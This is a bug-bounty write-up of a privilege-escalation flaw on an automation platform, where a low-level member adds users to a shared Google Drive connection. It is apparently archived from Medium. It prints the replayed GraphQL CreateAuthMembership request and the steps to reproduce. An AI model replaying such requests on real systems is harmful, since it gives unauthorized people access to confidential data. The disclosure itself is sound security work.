# 921$ Privilege Escalation

- **Source URL:** https://medium.com/@bilalresearcher/921-privilege-escalation-unauthorized-user-addition-to-shared-app-connections-681d807ccd1e?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240817000238/https://medium.com/@bilalresearcher/921-privilege-escalation-unauthorized-user-addition-to-shared-app-connections-681d807ccd1e
- **Fetched:** 2026-11-22
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/7003 (id 7003)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# 921$ Privilege Escalation: Unauthorized User Addition to Shared APP Connections

This article is about a bug which i founded in nov. of last year which allow an low level and unauthorized user to add a new user in shared app connection which give access to confidential data to unwanted user and affecting the integrity of the platform.

*Understanding Target*


Exapier, a platform that facilitates easy automation, connects various apps to automate workflows. Shared app connections, such as those with Google Drive, are pivotal for collaborative and efficient operations.

*Bug Discovery*


A flaw in Exapier’s access control allows low-level users to manipulate shared connections. Unauthorized additions to connections like Google Drive pose a significant security risk, breaching expected permissions.

Before we move on, if you like my write-ups, please support me by clapping, sharing, and you can clap up to 50 times here on Medium, it’s free. Thank you.


# Steps to Reproduce:

1. Firstly the Admin added the low level user into shared app(google drive) connection. Capture this request of adding the user for later use.
2. The low level user(attacker) can only access the shared app like drive data but he/she is not allowed to add new user.
3. Now attacker navigate to connection settings and click on edit connection name.
4. Intercepting the request,`POST /api/zap-management/graphql` and sends it to the repeater.
5. In the repeater, the attacker modifies the request parameters to the captured request of 1st step and replace the memberid to the user attacker wants to add, adding the following JSON :

`{"operationName":"CreateAuthMembership","variables":{"id":" - adminid - ","memberId":" - user u want to add in ID - -"},"query":"fragment PrimaryAuth on Authentication {\n created\n description\n destinationSelectedApi\n id\n identifier\n isPrivate\n isShared\n isStale\n permissions {\n delete\n edit\n reconnect\n share\n test\n transfer\n __typename\n }\n selectedApi\n sharedWithAll\n title\n __typename\n}\n\nfragment SecondaryAuth on Authentication {\n destinationSelectedApiImages {\n url16X16\n url32X32\n url64X64\n url128X128\n __typename\n }\n id\n owner {\n email\n id\n imageUrl\n name\n __typename\n }\n selectedApiImages {\n url16X16\n url32X32\n url64X64\n url128X128\n __typename\n }\n sharedWith {\n … on ShareTeam {\n description\n id\n imageUrl\n memberCount\n name\n type\n __typename\n }\n … on ShareMember {\n description\n email\n id\n imageUrl\n name\n type\n __typename\n }\n __typename\n }\n zapCount\n __typename\n}\n\nfragment Auth on Authentication {\n …PrimaryAuth\n …SecondaryAuth\n __typename\n}\n\nmutation CreateAuthMembership($id: ID!, $memberId: ID!) {\n createAuthMembership(id: $id, memberId: $memberId) {\n …Auth\n __typename\n }\n}"}`
6\. Or alternatively, the attacker can use the provided below request with low level user account:

```
POST /api/zap-management/graphql HTTP/2
Host: Exampier.com 
Cookie: 
Content-Length: 1343
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"
Apollographql-Client-Name: zap-management
X-Datadog-Trace-Id: 5783957597235720807
Correlation-Id: d999c76c-516e-4eec-87a1-8a6f2063e2d4
Sec-Ch-Ua-Mobile: ?0
```
 `{"operationName":"CreateAuthMembership","variables":{"id":" - admin ID - -","memberId":" - -user ID - "},"query":"fragment PrimaryAuth on Authentication {\n created\n description\n destinationSelectedApi\n id\n identifier\n isPrivate\n isShared\n isStale\n permissions {\n delete\n edit\n reconnect\n share\n test\n transfer\n __typename\n }\n selectedApi\n sharedWithAll\n title\n __typename\n}\n\nfragment SecondaryAuth on Authentication {\n destinationSelectedApiImages {\n url16X16\n url32X32\n url64X64\n url128X128\n __typename\n }\n id\n owner {\n email\n id\n imageUrl\n name\n __typename\n }\n selectedApiImages {\n url16X16\n url32X32\n url64X64\n url128X128\n __typename\n }\n sharedWith {\n … on ShareTeam {\n description\n id\n imageUrl\n memberCount\n name\n type\n __typename\n }\n … on ShareMember {\n description\n email\n id\n imageUrl\n name\n type\n __typename\n }\n __typename\n }\n zapCount\n __typename\n}\n\nfragment Auth on Authentication {\n …PrimaryAuth\n …SecondaryAuth\n __typename\n}\n\nmutation CreateAuthMembership($id: ID!, $memberId: ID!) {\n createAuthMembership(id: $id, memberId: $memberId) {\n …Auth\n __typename\n }\n}"}`
*You guys might be wondering how an attacker gets the request in real life. Attacker create a new account in Exampier where they have admin privileges. They capture the add user request and then use it later to exploit their company.*


7\. The attacker sends the modified request, which results in a 200 OK response, indicating that the user has been added to the connection.

8\. Now go to admin account add check that the user get added or not.

9\. The attacker successfully adds a user to the shared connection.

*Potential Impact*


Unauthorized user additions to shared connections compromise the integrity of collaborative platforms provide access of confidential data to unauthorized users. This security loophole may lead to misuse, unauthorized data access, and potential breaches of privacy.

*The Bounty*


Exapier acknowledged the severity of this bug and rewarded a bounty of $921 for its discovery and responsible disclosure.

*Takeaway*


This security loophole sheds light on the critical need for robust access controls. It underscores the importance of meticulous permission management, ensuring that only authorized personnel can manipulate shared connections. The key lesson here is clear: always play with permissions when finding or hunting for bugs.

Leave some clap if you enjoyed this read, leave your feedback in comment and consider following me for more exciting findings.


**Find me on Twitter**: @[bilalresearcher](https://x.com/bilalresearcher)
